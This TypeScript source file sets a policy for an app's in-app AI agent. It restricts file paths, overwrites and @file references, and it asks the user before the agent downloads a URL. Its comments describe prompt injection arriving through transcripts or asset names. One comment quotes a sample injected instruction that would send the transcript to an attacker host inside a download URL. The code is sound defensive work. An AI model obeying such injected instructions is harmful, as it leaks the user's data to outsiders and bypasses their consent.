/**
 * What a tool call may touch on disk, decided in main before it reaches the renderer.
 *
 * Two kinds of caller reach bay's tools, and they are not equally trusted:
 *
 * - **A terminal client** (Claude Code in a shell, an MCP client the user configured). It already
 *   has the user's filesystem through its own tools, so bay reading a file for it, or writing one
 *   where it asks, grants nothing new. Only the mistake-proofing rule applies: an export may not
 *   overwrite a file that is not media.
 * - **The in-app agent** (the panel). It has *no* filesystem tools by design — `--tools` leaves it
 *   bay's catalog and nothing else — so every path argument is its only way to reach a file, and
 *   text it reads (a transcript, an asset name, a composition) can carry a prompt injection. With
 *   "Ask before editing" off by default nothing asks the user first, so the limits live here:
 *   no `@file` references, no hidden files or folders, only paths under the home folder or the
 *   temp folder, and no overwriting a file that is not the kind the tool makes.
 *
 * The in-app agent connects on its own socket (`bay-agent.sock`), which is how main knows which
 * kind of caller it is — a property of the connection, not something a call can claim.
 */

import { extname, isAbsolute, resolve } from 'node:path'
import { isCompositionPath } from '@shared/composition'
import { VALIDATE_ONLY } from '@shared/mcp'
import { checkDownloadUrl, downloadConfirmation } from '@shared/url-import'
import { findFileReference } from './file-args'

export type CallOrigin = 'socket' | 'in-app'

/** What an export may replace: media of the kinds bay writes. */
const MEDIA_EXTENSIONS = new Set(['.mp4', '.mov', '.m4v', '.webm', '.mkv', '.wav', '.mp3', '.m4a', '.aac'])

export interface PolicyEnv {
  home: string
  /** Other folders the in-app agent may write under — the temp folders, by their real paths too. */
  roots: readonly string[]
  /** Null when the path does not exist; otherwise the first few KB, for "is this a composition?". */
  head(path: string): Promise<string | null>
  /**
   * Ask the person at the Mac, and resolve true only if they agreed. Absent where nobody can be
   * asked, which refuses anything that needs asking.
   */
  confirm?(message: string, detail: string): Promise<boolean>
}

const hidden = (path: string): boolean => path.split(/[\\/]/).some((segment) => segment.startsWith('.') && segment !== '.')

function insideAny(path: string, roots: readonly string[]): boolean {
  return roots.some((root) => path === root || path.startsWith(root.endsWith('/') ? root : `${root}/`))
}

/** A refusal, worded as what to do instead, or null to let the call through. */
export async function checkCallPolicy(
  tool: string,
  args: Record<string, unknown>,
  origin: CallOrigin,
  env: PolicyEnv
): Promise<string | null> {
  const inApp = origin === 'in-app'

  if (inApp) {
    const reference = findFileReference(args)
    if (reference) {
      return (
        `"${reference}" is a file reference, and bay's agent panel does not read files by reference. ` +
        `Pass the value itself in the call.`
      )
    }
  }

  /** The rules every in-app path argument shares. */
  const placeRule = (raw: unknown, what: string): string | null => {
    if (typeof raw !== 'string' || !isAbsolute(raw)) return null // the tool's own validation says so
    const path = resolve(raw)
    if (hidden(raw) || hidden(path)) {
      return `${what} ${raw} is inside a hidden file or folder, which bay's agent panel may not touch. Choose a normal folder, such as the project's.`
    }
    if (!insideAny(path, [env.home, ...env.roots])) {
      return `${what} ${raw} is outside your home folder. Choose a path under ${env.home}, such as the project's folder.`
    }
    return null
  }

  switch (tool) {
    case 'write_composition': {
      if (!inApp) return null
      const refused = placeRule(args['path'], 'The composition path')
      if (refused) return refused
      const path = String(args['path'])
      const existing = await env.head(path)
      // Rewriting a composition is the whole workflow; replacing someone's web page is not.
      if (existing !== null && !/data-composition-id/.test(existing)) {
        return (
          `${path} already exists and is not a composition, so it will not be overwritten. ` +
          `Write the composition to a new file name.`
        )
      }
      return null
    }
    case 'read_composition': {
      if (!inApp) return null
      const refused = placeRule(args['path'], 'The composition path')
      if (refused) return refused
      if (typeof args['path'] === 'string' && !isCompositionPath(args['path'])) {
        return `${args['path']} is not an .html composition; read_composition reads only compositions.`
      }
      return null
    }
    case 'export_timeline': {
      const raw = args['outputPath']
      if (typeof raw !== 'string' || !isAbsolute(raw)) return null
      if (inApp) {
        const refused = placeRule(raw, 'The export path')
        if (refused) return refused
      }
      const existing = await env.head(raw)
      if (existing !== null && !MEDIA_EXTENSIONS.has(extname(raw).toLowerCase())) {
        return (
          `${raw} already exists and is not a video or audio file, so an export will not overwrite it. ` +
          `Choose a new file name ending in the format's extension (for example .mp4).`
        )
      }
      return null
    }
    case 'import_url': {
      // A terminal client already has the network. The panel does not, and the address is the
      // one argument that leaves the Mac: an injected "download https://attacker/?q=<what I read>"
      // would carry the transcript out in the request itself. So the person is asked, with the
      // host and the whole address in front of them. A dry run downloads nothing and asks nobody.
      if (!inApp || args[VALIDATE_ONLY] === true) return null
      const checked = checkDownloadUrl(args['url'])
      if (!checked.ok) return null // the tool's own check says so, in its own words
      if (!env.confirm) {
        return `Downloading needs the user's go-ahead in bay's window, and bay could not ask. Nothing was downloaded.`
      }
      const { message, detail } = downloadConfirmation(checked)
      const agreed = await env.confirm(message, detail)
      return agreed
        ? null
        : `The user declined the download from ${checked.host}. Nothing was downloaded; do not ask again unless they bring it up.`
    }
    default:
      return null
  }
}
